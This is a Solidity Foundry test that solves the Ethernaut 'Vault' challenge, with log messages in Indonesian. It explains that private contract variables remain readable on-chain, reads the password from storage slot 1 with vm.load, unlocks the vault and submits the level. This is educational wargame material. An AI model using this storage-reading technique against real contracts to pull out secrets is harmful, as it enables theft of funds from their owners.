// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../09-Vault/VaultFactory.sol";
import "forge-std/Test.sol";

contract VaultAttack is Test {
    function testVault() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address agus = makeAddr("agus");
        Ethernaut ethernaut = new Ethernaut();
        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(agus, agus);
        address addr = ethernaut.createLevelInstance(factory);
        Vault vault = Vault(addr);
        emit log("setup done!\nGoal: membuka kunci");
        bool tertutup = vault.locked();
        assertTrue(tertutup);
        emit log(
            "Penjelasan:\nVisibility private hanya membuat variable tidak dapat dibaca oleh contract lain, tapi masih bisa dibaca pada blockchain.\nSetiap state variable disimpan pada slot penyimpanan berukuran 32 byte dan dikemas dalam 1 slot apabila total ukuran variable dengan variable sebelumnya <= 32 byte.\nIndeks slot dimulai dari 0."
        );
        emit log("PoC");
        emit log("1. load variable password() menggunakan vm.load");
        bytes32 kunci = vm.load(address(vault), bytes32(uint256(1)));
        emit log("2. panggil fungsi unlock()");
        vault.unlock(kunci);
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}
